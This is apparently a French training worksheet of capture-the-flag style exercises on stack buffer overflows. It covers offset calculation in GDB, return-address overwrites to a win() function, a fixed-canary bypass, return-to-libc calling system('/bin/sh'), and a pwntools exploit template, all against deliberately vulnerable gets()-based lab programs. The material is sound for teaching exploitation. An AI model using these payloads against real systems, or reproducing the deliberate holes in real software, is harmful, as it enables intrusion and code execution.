⚠️ AVERTISSEMENT : Exercices d'exploitation éducatifs. Uniquement sur tes propres systèmes de test. Usage malveillant est ILLÉGAL.


### EXERCICE 16 - STACK OVERFLOW ET REDIRECTION D'EXÉCUTION


### OBJECTIFS :
- Calculer l'offset vers la return address
- Écraser la return address avec une adresse cible
- Rediriger l'exécution vers des fonctions existantes
- Analyser la stack avec GDB
- Comprendre le layout du stack frame

DÉFIS D'EXPLOITATION

[ ] Défi 1 : Calculer l'offset avec GDB
    Crée un programme avec une fonction vulnerable(char *input).
    Utilise GDB pour :
    - Placer un breakpoint dans vulnerable
    - Examiner $rbp et &buffer
    - Calculer l'offset exact vers la return address (rbp + 8)
    - Documenter les adresses et calculs

[ ] Défi 2 : Redirection vers win()
    Programme avec deux fonctions :
    - void win() { printf("WIN!\n"); }
    - void vulnerable() { char buf[64]; gets(buf); }

    Écris un exploit qui :
    - Calcule l'offset (64 + 8 = 72 bytes)
    - Génère un payload : 'A'*72 + adresse_de_win (little-endian)
    - Redirige l'exécution vers win()

    Commande pour obtenir l'adresse de win() :
    objdump -d prog | grep '<win>'

[ ] Défi 3 : Return-to-function avec arguments
    Programme :
    void print_flag(int code) {
        if (code == 0x1337) printf("FLAG{...}\n");
    }

    void vuln() { char buf[100]; gets(buf); }

    Redirige vers print_flag ET passe 0x1337 en argument.
    Rappel: Sur x64, premier argument dans RDI.
    Il faut un ROP gadget "pop rdi; ret"

[ ] Défi 4 : Bypass d'un canary faible
    Programme avec un "canary" manuel :
    unsigned long canary = 0xDEADBEEF;
    char buffer[64];
    // ... return address

    Le canary est fixe (pas aléatoire). Exploite en :
    - Écrasant buffer (64 bytes)
    - Réécrivant le canary avec la bonne valeur (0xDEADBEEF)
    - Écrasant saved RBP (8 bytes)
    - Écrasant return address (8 bytes)

    Payload : 'A'*64 + p64(0xDEADBEEF) + 'B'*8 + p64(win_addr)

[ ] Défi 5 : Leak d'adresse et exploitation
    Programme qui affiche l'adresse de buffer :
    printf("Buffer at: %p\n", buffer);

    Utilise cette adresse pour :
    - Calculer où placer un shellcode dans le buffer
    - Rediriger vers le début du buffer
    - Note: Nécessite -z execstack

[ ] Défi 6 : Return-to-libc basique
    Redirige vers system("/bin/sh") en utilisant :
    - L'adresse de system() dans la libc
    - L'adresse d'une chaîne "/bin/sh" (tu peux la placer dans le buffer)

    Étapes :
    1. Trouver l'adresse de system : ldd ./prog | grep libc
    2. Offset de system : readelf -s /lib/..../libc.so.6 | grep system
    3. Placer "/bin/sh" dans le buffer
    4. Payload : padding + system_addr + ret_addr + ptr_to_binsh

[ ] Défi 7 : Pattern pour trouver l'offset exact
    Utilise un pattern cyclique pour identifier l'offset exact :

    Python :
    from pwn import *
    pattern = cyclic(200)
    # Envoyer au programme
    # Crash avec segfault
    # Dans GDB : examiner RIP/RSP
    # Utiliser cyclic_find(address) pour trouver l'offset

[ ] Défi 8 : Exploitation complète d'un binaire CTF
    Crée un programme complet de style CTF :
    - Menu avec plusieurs fonctions
    - Une fonction win() cachée
    - Une fonction vulnerable() accessible
    - Buffer overflow dans vulnerable

    Écris un exploit Python complet avec pwntools :
    ```python
    from pwn import *

    p = process('./ctf_binary')
    win_addr = 0x...  # À trouver avec objdump
    payload = b'A' * 72 + p64(win_addr)
    p.sendline(payload)
    p.interactive()
    ```

TECHNIQUES

1. Trouver les adresses de fonctions :
   objdump -d binary | grep '<function_name>'
   nm binary | grep function_name

2. Vérifier les protections :
   checksec binary
   readelf -l binary | grep STACK

3. Calculer l'offset avec GDB :
   (gdb) break vulnerable
   (gdb) run
   (gdb) info frame
   (gdb) print $rbp+8 - &buffer

4. Générer un payload Python :
   import struct
   payload = b'A' * offset
   payload += struct.pack('<Q', target_addr)  # little-endian 64-bit

5. Pattern cyclique (pwntools) :
   from pwn import cyclic, cyclic_find
   payload = cyclic(200)
   # Après crash, utiliser cyclic_find sur la valeur dans RIP

COMMANDES GDB ESSENTIELLES

# Démarrer
gdb ./program

# Breakpoint
(gdb) break vulnerable
(gdb) break *0x401234    # Adresse spécifique

# Exécuter
(gdb) run
(gdb) run < payload.txt

# Examiner
(gdb) info registers
(gdb) info frame
(gdb) x/32gx $rsp        # 32 quadwords depuis RSP
(gdb) x/s 0x7fff...      # Chaîne à une adresse
(gdb) x/i $rip           # Instruction courante

# Désassembler
(gdb) disassemble main
(gdb) disassemble vulnerable

# Calculer
(gdb) print $rbp+8 - &buffer
(gdb) print/x &win

# Continuer
(gdb) continue
(gdb) step
(gdb) next

OUTILS

- GDB : analyse et debugging
- objdump : désassemblage
- readelf : analyse des binaires ELF
- nm : liste des symboles
- checksec : vérification des protections
- pwntools : framework Python d'exploitation
- ROPgadget : trouver des gadgets ROP

VALIDATION

Chaque exploit doit :
✓ Rediriger l'exécution vers la fonction cible
✓ Être reproductible
✓ Documenter le calcul de l'offset
✓ Inclure un script Python pour génération du payload
✓ Fonctionner avec les protections désactivées (-fno-stack-protector -z execstack -no-pie)

